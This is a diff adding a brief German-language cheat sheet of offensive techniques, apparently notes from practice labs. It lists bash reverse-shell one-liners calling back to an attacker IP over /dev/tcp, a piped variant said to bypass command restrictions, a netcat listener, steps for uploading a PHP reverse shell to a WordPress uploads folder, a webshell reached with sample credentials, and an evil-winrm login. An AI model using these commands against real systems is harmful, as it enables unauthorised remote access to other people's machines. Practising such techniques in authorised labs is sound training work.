@@ -1,0 +1,26 @@
+Bash Reverse Shell
+bash -i >& /dev/tcp/192.168.1.157/5555 0>&1
+Öffnet eine interaktive Bash-Shell mit Reverse-Verbindung zur Angriffsmaschine (Port 5555).
+
+echo 'bash -i >& /dev/tcp/192.168.1.157/5555 0>&1' | bash
+Umgeht Befehlseinschränkungen durch Piping.
+
+Netcat Listener
+sudo nc -nvlp 5555
+Startet einen Listener auf Port 5555 zur Aufnahme einer Reverse Shell.
+
+PHP Reverse Shell
+Upload einer PHP-Reverse-Shell (z. B. von pentestmonkey) auf eine WordPress-Seite:
+http://192.168.1.231/weblog/wp-content/uploads/slideshow-gallery/php-reverse-shell.php
+IP und Port im Script anpassen (z. B. 192.168.1.157:5555), dann im Browser aufrufen.
+
+Webshell-Aufruf
+http://192.168.1.155/dev
+Ruft eine Webshell auf, nachdem Zugangsdaten (z. B. nick:bulldog) ermittelt wurden.
+
+nach nano id.sh eine bash shell, danach Listener starten und die reverse shell speichern, triggert diese
+
+nc -nv IP Port kann schon manchmal nach nmap-Scan Shell geben
+
+WinRM muss auf dem Ziel aktiviert und erreichbar sein (Port 5985 für HTTP oder 5986 für HTTPS).
+evil-winrm -i <IP> -u <username> -p <password>
